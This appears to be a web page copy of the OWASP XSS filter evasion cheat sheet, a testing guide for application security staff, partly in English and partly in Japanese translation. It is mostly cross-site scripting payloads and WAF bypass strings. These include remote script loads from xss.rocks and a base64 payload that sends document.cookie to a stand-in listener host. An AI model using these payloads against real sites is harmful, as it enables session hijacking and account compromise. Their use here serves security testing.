<!-- markdownlint-disable MD038-->
```html
<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
```html
<!-- markdownlint-enable MD038-->

Here's an XSS example which works if the regex won't catch a matching pair of quotes but instead will find any quotes to terminate a parameter string improperly:

```html
<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```text

This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:

```html
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
```text

### URL String Evasion

The following attacks work if `http://www.google.com/` is programmatically disallowed:

#### IP Versus Hostname

```html
<A HREF="http://66.102.7.147/">XSS</A>
```text

#### URL Encoding

```html
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
```text

#### DWORD Encoding

Note: there are other of variations of DWORD encoding - see the IP Obfuscation calculator below for more details:

```html
<A HREF="http://1113982867/">XSS</A>
```text

#### Hex Encoding

The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quote is not required:

```html
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
```text

#### Octal Encoding

Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc:

```html
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
```text

#### Base64 Encoding

```html
<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
```text

#### Mixed Encoding

Let's mix and match base encoding and throw in some tabs and newlines (why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes:

<!-- markdownlint-disable MD010-->
```html
<A HREF="h
tt  p://6	6.000146.0x7.147/">XSS</A>
```html
<!-- markdownlint-enable MD010-->

#### Protocol Resolution Bypass

`//` translates to `http://`, which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like `(ht|f)tp(s)?://` (thanks to Ozh for part of this one). You can also change the `//` to `\\\\\\\\`. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL:

```html
<A HREF="//www.google.com/">XSS</A>
```text

#### Removing CNAMEs

When combined with the above URL, removing `www.` will save an additional 4 bytes for a total byte savings of 9 for servers that have set this up properly:

```html
<A HREF="http://google.com/">XSS</A>
```text

Extra dot for absolute DNS:

```html
<A HREF="http://www.google.com./">XSS</A>
```text

#### JavaScript Link Location

```html
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```text

#### Content Replace as Attack Vector

<!-- markdownlint-disable MD010-->
Assuming `http://www.google.com/` is programmatically replaced with nothing. A similar attack vector has been used against several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector `java&\\#x09;script:` was converted into `java	script:`, which renders in IE:
<!-- markdownlint-enable MD010-->

```html
<A HREF="http://www.google.com/ogle.com/">XSS</A>
```text

### Assisting XSS with HTTP Parameter Pollution

If a content sharing flow on a web site is implemented as shown below, this attack will work. There is a `Content` page which includes some content provided by users and this page also includes a link to `Share` page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the `title` parameter in the `Content` page to prevent against XSS but for some reasons they didn't URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since `content_type`'s value is a constant and will always be integer, they didn't encode or validate the `content_type` in the `Share` page.

#### Content Page Source Code

```html
a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
```text

#### Share Page Source Code

```javascript
<script>
var contentType = <%=Request.getParameter("content_type")%>;
var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
...
//some user agreement and sending to server logic might be here
...
</script>
```text

#### Content Page Output

If attacker set the untrusted content title as `This is a regular title&content_type=1;alert(1)` the link in `Content` page would be this:

```html
<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
```text

#### Share Page Output

And in share page output could be this:

```javascript
<script>
var contentType = 1; alert(1);
var title = "This is a regular title";
…
//some user agreement and sending to server logic might be here
…
</script>
```text

As a result, in this example the main flaw is trusting the content_type in the `Share` page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS.

## Character Escape Sequences

Here are all the possible combinations of the character `\\<` in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above.

- `<`
- `%3C`
- `&lt`
- `&lt;`
- `&LT`
- `&LT;`
- `&#60`
- `&#060`
- `&#0060`
- `&#00060`
- `&#000060`
- `&#0000060`
- `&#60;`
- `&#060;`
- `&#0060;`
- `&#00060;`
- `&#000060;`
- `&#0000060;`
- `&#x3c`
- `&#x03c`
- `&#x003c`
- `&#x0003c`
- `&#x00003c`
- `&#x000003c`
- `&#x3c;`
- `&#x03c;`
- `&#x003c;`
- `&#x0003c;`
- `&#x00003c;`
- `&#x000003c;`
- `&#X3c`
- `&#X03c`
- `&#X003c`
- `&#X0003c`
- `&#X00003c`
- `&#X000003c`
- `&#X3c;`
- `&#X03c;`
- `&#X003c;`
- `&#X0003c;`
- `&#X00003c;`
- `&#X000003c;`
- `&#x3C`
- `&#x03C`
- `&#x003C`
- `&#x0003C`
- `&#x00003C`
- `&#x000003C`
- `&#x3C;`
- `&#x03C;`
- `&#x003C;`
- `&#x0003C;`
- `&#x00003C;`
- `&#x000003C;`
- `&#X3C`
- `&#X03C`
- `&#X003C`
- `&#X0003C`
- `&#X00003C`
- `&#X000003C`
- `&#X3C;`
- `&#X03C;`
- `&#X003C;`
- `&#X0003C;`
- `&#X00003C;`
- `&#X000003C;`
- `\\x3c`
- `\\x3C`
- `\\u003c`
- `\\u003C`

## Methods to Bypass WAF – Cross-Site Scripting

### General issues

#### Stored XSS

If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.

#### Reflected XSS in JavaScript

Example:

```javascript
<script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
```text

Exploitation:

```javascript
/?xss=500); alert(document.cookie);//
```text

#### DOM-based XSS

Example:

```javascript
<script> ... eval($\_GET\[xss\]); ... </script>
```text

Exploitation:

```javascript
/?xss=document.cookie
```text

#### XSS via request Redirection

Vulnerable code:

```javascript
...
header('Location: '.$_GET['param']);
...
```text

As well as:

```javascript
...
header('Refresh: 0; URL='.$_GET['param']);
...
```text

This request will not pass through the WAF:

```html
/?param=<javascript:alert(document.cookie>)
```text

This request will pass through the WAF and an XSS attack will be conducted in certain browsers:

```html
/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```text

### WAF ByPass Strings for XSS

<!-- markdownlint-disable MD038-->
- `&lt;Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
- `&lt;Video> <source onerror = "javascript: alert (XSS)">`
- `&lt;Input value = "XSS" type = text>`
- `<applet code="javascript:confirm(document.cookie);">`
- `<isindex x="javascript:" onmouseover="alert(XSS)">`
- `">&lt;/SCRIPT&gt;”>’>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;`
- `"><img src="x:x" onerror="alert(XSS)">`
- `"><iframe src="javascript:alert(XSS)">`
- `<object data="javascript:alert(XSS)">`
- `<isindex type=image src=1 onerror=alert(XSS)>`
- `<img src=x:alert(alt) onerror=eval(src) alt=0>`
- `<img  src="x:gif" onerror="window['al\\u0065rt'](0)"></img>`
- `<iframe/src="data:text/html,<svg onload=alert(1)>">`
- `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`
- `<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script`
- `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
- `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`
- `<form><a href="javascript:\\u0061lert(1)">X`
- `</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>`
- `<style>//*&#123;x:expression(alert(/xss/))&#125;//<style></style>`

 On Mouse Over​:

- `<img src="/" =_=" title="onerror='prompt(1)'">`
- `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`
- `<script x> alert(1) </script 1=2`
- `<form><button formaction=javascript&colon;alert(1)>CLICKME`
- `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
- `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
- `&lt;OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83">&lt;PARAM NAME="DataURL" VALUE="javascript:alert(1)">&lt;/OBJECT&gt; `
<!-- markdownlint-enable MD038-->

### Filter Bypass Alert Obfuscation

- `(alert)(1)`
- `a=alert,a(1)`
- `[1].find(alert)`
- `top[“al”+”ert”](1)`
- `top[/al/.source+/ert/.source](1)`
- `al\\u0065rt(1)`
- `top[‘al\\145rt’](1)`
- `top[‘al\\x65rt’](1)`
- `top[8680439..toString(30)](1)`
- `alert?.()`
- `(alert())`

The payload should include leading and trailing backticks:

```javascript
&#96;`${alert``}`&#96;
```html

</section>

<section id="xss-filter-evasion-translation-panel" className="tabPanel translationPanel contentPanel">

## はじめに

この記事は、アプリケーションセキュリティ専門家向けの Cross Site Scripting (XSS) テストガイドである。このチートシートは、以前 `http://ha.ckers.org/xss.html` にあった RSnake の代表的な XSS Cheat Sheet を基にしていた。現在は OWASP Cheat Sheet Series が、更新・保守された版として提供している。最初期の OWASP Cheat Sheet である [Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) は RSnake の成果に着想を得たものであり、その貢献に謝意を示す。

## テスト

このチートシートは、特定の XSS 防御フィルタを迂回できる一連の XSS 攻撃例をテスターに示すことで、入力フィルタリングが XSS に対する不完全な防御であることを説明している。

### フィルタ回避なしの基本的な XSS テスト

通常の XSS JavaScript インジェクションを使うこの攻撃は、このチートシートの基準線となる。現代のブラウザでは引用符は不要なため、ここでは省略している。

```html
<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
```text

### XSS ロケータ (Polyglot)

このテストは、HTML、スクリプト文字列、JavaScript、URL など複数のコンテキストで実行される「polyglot test XSS payload」を投入する。

```javascript
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```text

([Gareth Heyes](https://twitter.com/garethheyes) によるこの [tweet](https://twitter.com/garethheyes/status/997466212190781445) に基づく。)

### 不正な A タグ

このテストは [`href`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href) 属性を省略し、イベントハンドラを使った XSS 攻撃を示す。

```javascript
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
```text

Chrome は不足している引用符を自動的に挿入する。問題が発生する場合は引用符を省略すると、Chrome が URL やスクリプト内の不足した引用符を補う。

```javascript
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
```text

(David Cross による投稿、Chrome で検証済み。)

### 不正な IMG タグ

この XSS 手法は、緩いレンダリングエンジンの解釈を利用して IMG タグ内に XSS ベクタを作る。これは引用符で囲む必要がある。この挙動はもともと粗いコーディングを補正するためのものだったと考えられるが、HTML タグを正しく解析することも大幅に難しくする。

```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```text

(もとは Begeek による発見だが、すべてのブラウザで動作するように整理・短縮された。)

### fromCharCode

システムがどの種類の引用符も許可しない場合、JavaScript で `fromCharCode` を `eval()` し、必要な XSS ベクタを作成できる。

```html
<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
```text

### SRC ドメインを検査するフィルタを通過するデフォルト SRC タグ

この攻撃は多くの SRC ドメインフィルタを迂回する。イベントハンドラに JavaScript を挿入する手法は、Form、Iframe、Input、Embed など任意の HTML タグ型インジェクションにも当てはまる。また、`onblur` や `onclick` など、そのタグ種別に関連する任意のイベントに置き換えられるため、ここに挙げたインジェクションには広いバリエーションがある。

```html
<IMG SRC=# onmouseover="alert('xxs')">
```text

(David Cross による投稿、Abdullah Hussam による編集。)

### 空にしておくデフォルト SRC タグ

```html
<IMG SRC= onmouseover="alert('xxs')">
```text

### 完全に省略するデフォルト SRC タグ

```html
<IMG onmouseover="alert('xxs')">
```text

### エラー時の Alert

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```text

### IMG onerror と JavaScript Alert のエンコード

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```text

### 10 進 HTML 文字参照

Firefox では `&lt;IMG` タグ内の `javascript:` ディレクティブを使う XSS 例が動作しないため、この手法では回避策として 10 進 HTML 文字参照を使う。

```html
 <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
```text

### 末尾セミコロンなしの 10 進 HTML 文字参照

これは、文字列 `&\\#XX;` を探す XSS フィルタの迂回に有効なことが多い。多くの人は、合計 7 桁まで数値文字をパディングできることを知らないためである。また、HTML エンコード文字列を終端するにはセミコロンが必須だと誤って仮定する `$tmp\\_string =\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/;` のようなデコード処理に対しても有用である。この種の処理は実環境で確認されている。

```html
<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
```text

### 末尾セミコロンなしの 16 進 HTML 文字参照

この攻撃も `$tmp\\_string=\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/;` という文字列に対するフィルタに有効である。その処理は `#` 記号の後に数値文字が続くと仮定しているが、16 進 HTML 文字ではそうではない。

```html
<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
```text

### 埋め込みタブ

この手法は XSS 攻撃文字列を分断する。

<!-- markdownlint-disable MD010-->
```html
 <a href="jav	ascript:alert('XSS');">Click Me</a>
```html
<!-- markdownlint-enable MD010-->

### エンコードされた埋め込みタブ

この手法も XSS を分断できる。

```html
 <a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
```text

### XSS を分断する埋め込み改行

一部の防御側は 10 進 09 から 13 の任意の文字がこの攻撃に使えると主張するが、それは正しくない。動作するのは 09 (水平タブ)、10 (改行)、13 (キャリッジリターン) だけである。参考として [ASCII table](https://man7.org/linux/man-pages/man7/ascii.7.html) を確認すること。次の 4 つの XSS 攻撃例がこのベクタを示している。

```html
<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
```text

#### 例 1: 埋め込みキャリッジリターンで XSS 攻撃を分断する

注: 上記では、本来より長い文字列にしている。ゼロは省略できるためである。フィルタが 16 進や 10 進エンコードを 2 文字または 3 文字でなければならないと仮定している例をよく見てきたが、実際の規則は 1 から 7 文字である。

```html
<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
```text

#### 例 2: NULL で JavaScript ディレクティブを分断する

NULL 文字も XSS ベクタとして機能するが、上記と同じではない。Burp Proxy のようなツールで直接注入するか、URL 文字列で `%00` を使う必要がある。独自のインジェクションツールを書く場合は、vim で `^V^@` を使うと NULL を生成できる。また、次のプログラムでテキストファイルに生成できる。NULL 文字 `%00` ははるかに有用であり、この例の変種で実際のフィルタを迂回する助けになった。

```bash
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>;"' > out
```text

#### 例 3: 画像 XSS における JavaScript の前のスペースとメタ文字

これは、フィルタのパターンマッチが `javascript:` という語の中のスペースを考慮していない場合に有用である。その語中のスペースはレンダリングされないため正しいが、引用符と `javascript:` キーワードの間にスペースを入れられないと誤って仮定している。実際には、10 進 1 から 32 の任意の文字を入れられる。

```html
<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
```text

#### 例 4: 英数字以外による XSS

Firefox の HTML パーサは、HTML キーワードの後に英数字以外があると有効ではないとみなし、HTML タグ後の空白または無効なトークンとして扱う。問題は、一部の XSS フィルタが、探しているタグは空白で分断されると仮定している点である。たとえば `\\&lt;SCRIPT\\\\s` は `\\&lt;SCRIPT/XSS\\\\s` と等しくない。

```html
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
```text

上記と同じ考え方に基づき、Rsnake の fuzzer を使って発展させたものである。Gecko レンダリングエンジンでは、イベントハンドラと等号の間に、文字、数字、引用符や山括弧などの囲み文字以外の任意の文字を許可するため、クロスサイトスクリプティングブロックを迂回しやすくなる。ここに示すように、グレイヴアクセント文字にも適用される。

```html
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```text

Yair Amit は、Trident (IE) と Gecko (Firefox) のレンダリングエンジンの間に少し異なる挙動があり、タグとパラメータの間に空白なしでスラッシュだけを置けることを指摘した。システムが空白を許可しない場合、この攻撃で有用になり得る。

```html
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
```text

### 余分な開始山括弧

この XSS ベクタは、開始・終了山括弧の対応を確認してから中のタグを比較する検出エンジンを破れる可能性がある。これは、もちろん難読化解除後に、開始山括弧と関連タグの文字列全体を探す [Boyer-Moore](https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm) のような効率的なアルゴリズムとは異なる。二重スラッシュは末尾の余分な括弧をコメントアウトし、JavaScript エラーを抑制する。

```html
<<SCRIPT>alert("XSS");//\<</SCRIPT>
```text

(Franz Sedlmaier による投稿。)

### 閉じ script タグなし

Firefox では、この XSS ベクタの `\\>&lt;/SCRIPT&gt;` 部分は実際には不要である。Firefox は HTML タグを閉じても安全だと仮定し、閉じタグを追加するためである。Firefox に影響しない次の攻撃とは異なり、この方法では下に追加の HTML を必要としない。必要であれば引用符を追加できるが、通常は不要である。

```html
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
```text

### Script タグ内のプロトコル解決

この変種は、下記の Ozh によるプロトコル解決バイパスに一部基づいており、IE と互換モードの Edge で動作する。スペースが問題になる場所で特に有用であり、もちろんドメインが短いほどよい。ブラウザは SCRIPT タグの文脈で理解するため、エンコード種別に関係なく `.j` は有効である。

```html
<SCRIPT SRC=//xss.rocks/.j>
```text

(Łukasz Pilorz による投稿。)

### 半開き HTML/JavaScript XSS ベクタ

Firefox とは異なり、IE のレンダリングエンジン (Trident) はページに余分なデータを追加しないが、画像内の `javascript:` ディレクティブを許可する。このベクタは閉じ山括弧を必要としないため有用である。これは、この XSS ベクタを注入する位置の下に何らかの HTML タグが存在することを前提にしている。閉じ `>` タグがなくても、下にあるタグがそれを閉じる。注記として、下にある HTML によっては HTML が壊れる。

次のネットワーク侵入検知システム (NIDS) 正規表現 `/((\\%3D)|(=))\\[^\\n\\]\\*((\\%3C)|\\<)\\[^\\n\\]+((\\%3E)|\\>)/` を迂回する。末尾の `>` を必要としないためである。補足すると、これは実環境の XSS フィルタに対し、`&lt;IMG` タグではなく開いたままの `&lt;IFRAME` タグを使う形でも有効だった。

```html
<IMG SRC="`<javascript:alert>`('XSS')"
```text

### JavaScript エスケープのエスケープ

アプリケーションがユーザー情報を JavaScript 内に出力するように書かれている場合、たとえば `&lt;SCRIPT>var a="$ENV&#123;QUERY\\_STRING&#125;";&lt;/SCRIPT&gt;` のような形で、そこへ独自の JavaScript を注入したいがサーバ側アプリケーションが特定の引用符をエスケープする場合、そのエスケープ文字自体をエスケープすることで回避できる。これが注入されると `&lt;SCRIPT>var a="\\\\";alert('XSS');//";&lt;/SCRIPT&gt;` と読まれ、二重引用符のエスケープが解除されて XSS ベクタが発火する。

```javascript
\";alert('XSS');//
```text

埋め込みデータに正しい JSON または JavaScript エスケープが適用されているが HTML エンコーディングがされていない場合の代替手段は、script ブロックを終了して独自のブロックを開始することである。

```html
</script><script>alert('XSS');</script>
```text

### title タグの終了

これは `&lt;TITLE>` タグを閉じる単純な XSS ベクタであり、悪意のあるクロスサイトスクリプティング攻撃を包み込める。

```html
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
```text

#### INPUT Image

```html
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
```text

#### BODY Image

```html
<BODY BACKGROUND="javascript:alert('XSS')">
```text

#### IMG Dynsrc

```html
<IMG DYNSRC="javascript:alert('XSS')">
```text

#### IMG Lowsrc

```html
<IMG LOWSRC="javascript:alert('XSS')">
```text

### List-style-image

この難解な攻撃は、箇条書きリスト用の画像埋め込みに注目する。JavaScript ディレクティブに依存するため IE レンダリングエンジンでのみ動作する。特に有用な XSS ベクタではない。

```html
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
```text

### 画像内の VBscript

```html
<IMG SRC='vbscript:msgbox("XSS")'>
```text

### SVG Object タグ

```html
<svg/onload=alert('XSS')>
```text

### ECMAScript 6

```javascript
Set.constructor`alert\x28document.domain\x29
```text

### BODY タグ

この攻撃は、XSS 攻撃を実現するために `javascript:` や `&lt;SCRIPT...` の変種を使う必要がない。Dan Crowley は、等号の前にスペースを置けることを指摘している (`onload=` と `onload =` は異なる)。

```html
<BODY ONLOAD=alert('XSS')>
```text

#### イベントハンドラを使った攻撃

BODY タグによる攻撃は、上記と似た XSS 攻撃で使えるように変更できる。執筆時点では、この一覧はネット上で最も包括的なものとされている。HTML+TIME の更新について Rene Ledosquet に謝意を示す。

[Dottoro Web Reference](http://help.dottoro.com/) にも JavaScript イベントの優れた [list of events in JavaScript](http://help.dottoro.com/ljfvvdnm.php) がある。

次のイベントハンドラは、ブラウザや要素の状態変化、ユーザー操作、データ更新、メディア再生、履歴操作、フォーム送信などを契機に攻撃文字列を実行する候補になる。括弧内の説明は原文の発火条件を要約したものである。

- `onAbort()` (画像読み込みをユーザーが中止したとき)
- `onActivate()` (オブジェクトがアクティブ要素に設定されたとき)
- `onAfterPrint()` (印刷または印刷プレビュー後)
- `onAfterUpdate()` (ソースオブジェクトのデータ更新後)
- `onBeforeActivate()` (アクティブ要素に設定される前)
- `onBeforeCopy()` / `onCopy()` (選択範囲のコピー直前またはコピー時。`execCommand("Copy")` で悪用可能)
- `onBeforeCut()` / `onCut()` (選択範囲の切り取り直前または切り取り時)
- `onBeforeDeactivate()` / `onDeactivate()` (アクティブ要素が変わるとき)
- `onBeforeEditFocus()` (編集可能要素が UI でアクティブ化される前)
- `onBeforePaste()` / `onPaste()` (貼り付け時。`execCommand("Paste")` で強制される場合がある)
- `onBeforePrint()` (印刷前。`print()` や `execCommand("Print")` で誘発可能)
- `onBeforeUnload()` / `onUnload()` (ブラウザやページの終了・遷移時)
- `onBeforeUpdate()` / `onErrorUpdate()` (データ更新の前または更新エラー時)
- `onBegin()` / `onEnd()` / `onRepeat()` / `onResume()` / `onReverse()` / `onSeek()` / `onTimeError()` (HTML+TIME などのタイムライン制御時)
- `onBlur()` / `onFocus()` / `onFocusIn()` / `onFocusOut()` (ウィンドウや要素のフォーカス変化時)
- `onBounce()` / `onFinish()` / `onStart()` (marquee の移動やループ状態に応じて発火)
- `onCellChange()` / `onDataAvailable()` / `onDataSetChanged()` / `onDataSetComplete()` (データプロバイダやデータセットの変化時)
- `onChange()` / `onInput()` / `onPropertyChange()` / `onReadyStateChange()` (入力値、テキスト内容、プロパティ、readyState の変化時)
- `onClick()` / `onDblClick()` / `onContextMenu()` / `onMouseDown()` / `onMouseUp()` / `onMouseEnter()` / `onMouseLeave()` / `onMouseMove()` / `onMouseOut()` / `onMouseOver()` / `onMouseWheel()` (クリック、右クリック、マウス移動やホバー、ホイール操作時)
- `onControlSelect()` / `onSelect()` / `onSelectionChange()` / `onSelectStart()` (制御選択やテキスト選択時。`window.document.execCommand("SelectAll");` で初期化可能)
- `onDrag()` / `onDragStart()` / `onDragEnter()` / `onDragOver()` / `onDragLeave()` / `onDragEnd()` / `onDragDrop()` / `onDrop()` (ドラッグアンドドロップ操作時)
- `onError()` / `onFilterChange()` (文書・画像読み込みエラーや視覚フィルタ変更完了時)
- `onHashChange()` / `onMessage()` / `onPopState()` / `onStorage()` (フラグメント、メッセージ、履歴、ストレージの変化時)
- `onHelp()` (フォーカス中に F1 が押されたとき)
- `onKeyDown()` / `onKeyPress()` / `onKeyUp()` (キー操作時)
- `onLayoutComplete()` (印刷または印刷プレビュー時)
- `onLoad()` (ウィンドウ読み込み後)
- `onLoseCapture()` ( `releaseCapture()` メソッドで悪用可能)
- `onMediaComplete()` / `onMediaError()` / `onTrackChange()` (ストリーミングメディアやプレイリスト状態の変化時)
- `onMove()` / `onMoveStart()` / `onMoveEnd()` / `onResize()` / `onResizeStart()` / `onResizeEnd()` (ページ移動やウィンドウリサイズ時。`self.resizeTo(500,400)` などで誘発可能)
- `onOffline()` / `onOnline()` (ブラウザのオンライン・オフライン状態が変わるとき)
- `onOutOfSync()` / `onSyncRestored()` (タイムラインで定義されたメディア再生能力が中断・復元されるとき)
- `onRedo()` / `onUndo()` (undo 履歴を前後に移動したとき)
- `onReset()` / `onSubmit()` (フォームのリセットまたは送信時)
- `onRowsEnter()` / `onRowExit()` / `onRowDelete()` / `onRowInserted()` (データソースの行変更時)
- `onScroll()` (スクロール時。`scrollBy()` で誘発可能)
- `onStop()` (停止ボタンまたはページ離脱時)
- `onURLFlip()` (HTML+TIME メディアタグで再生される ASF ファイルが埋め込みスクリプトコマンドを処理したとき)
- `seekSegmentTime()` (セグメントタイムライン上の指定点を探し、その位置から再生を開始するメソッド)

#### BGSOUND

```javascript
<BGSOUND SRC="javascript:alert('XSS');">
```text

#### & JavaScript includes

```html
<BR SIZE="&{alert('XSS')}">
```text

#### STYLE sheet

```html
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```text

### リモートスタイルシート

リモートスタイルシートのような単純なものを使うだけで、style パラメータを埋め込み expression で再定義できるため XSS を含められる。これは IE でのみ動作する。ページ上には JavaScript が含まれていることを示すものがない点に注意する。注記として、これらのリモートスタイルシート例はすべて body タグを使うため、ベクタ自体以外のコンテンツがページにないと動作しない。空白ページで動かすには、ページに 1 文字を追加する必要がある。

```html
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
```text

#### リモートスタイルシート part 2

上と同じように動作するが、`&lt;LINK>` タグではなく `&lt;STYLE>` タグを使う。このベクタのわずかな変種は Google Desktop の侵害に使われた。補足として、ベクタの直後にそれを閉じる HTML がある場合、末尾の `&lt;/STYLE&gt;` タグを削除できる。これは、クロスサイトスクリプティング攻撃内に等号もスラッシュも置けない場合に有用であり、少なくとも一度は実環境で発生している。

```html
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
```text

#### リモートスタイルシート part 3

これは Gecko レンダリングエンジンでのみ動作し、XUL ファイルを親ページにバインドすることで機能する。

```html
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
```text

### XSS のために JavaScript を分断する STYLE タグ

この XSS は、IE を alert の無限ループに陥らせることがある。

```html
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```text

### Expression を分断する STYLE 属性

```html
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```text

(Roman Ivanov による作成。)

### Expression を使う IMG STYLE

これは実際には直前 2 つの XSS ベクタの混合だが、STYLE タグを解析し分解することがいかに難しいかをよく示している。IE をループさせる可能性がある。

```html
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
```text

### Background-image を使う STYLE タグ

```html
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
```text

### Background を使う STYLE タグ

```html
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
```text

### STYLE 属性を持つ匿名 HTML

IE レンダリングエンジンは、作成した HTML タグが実在するかどうかをあまり気にしない。開始山括弧と文字で始まっていればよい。

```html
<XSS STYLE="xss:expression(alert('XSS'))">
```text

### ローカル htc ファイル

これは直前 2 つの XSS ベクタとは少し異なり、XSS ベクタと同じサーバ上にある必要がある `.htc` ファイルを使う。この例のファイルは JavaScript を取り込み、style 属性の一部として実行する。

```html
<XSS STYLE="behavior: url(xss.htc);">
```text

### US-ASCII エンコーディング

この攻撃は 8 ビットではなく 7 ビットの不正な ASCII エンコーディングを使う。この XSS 手法は多くのコンテンツフィルタを迂回する可能性があるが、ホストが US-ASCII エンコーディングで送信している場合、または攻撃者がエンコーディングを自分で設定できる場合にのみ動作する。サーバ側フィルタ回避よりも、Web Application Firewall (WAF) の XSS 回避に対してより有用である。デフォルトで US-ASCII エンコーディングを送信し続けている既知のサーバは Apache Tomcat だけである。

```html
¼ script ¾ alert(¢XSS¢)¼/script ¾
```text

### META

meta refresh の奇妙な点は、ヘッダで referrer を送信しないことである。そのため、参照元 URL を消す必要がある特定種の攻撃で使える。

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
```text

#### Data を使う META

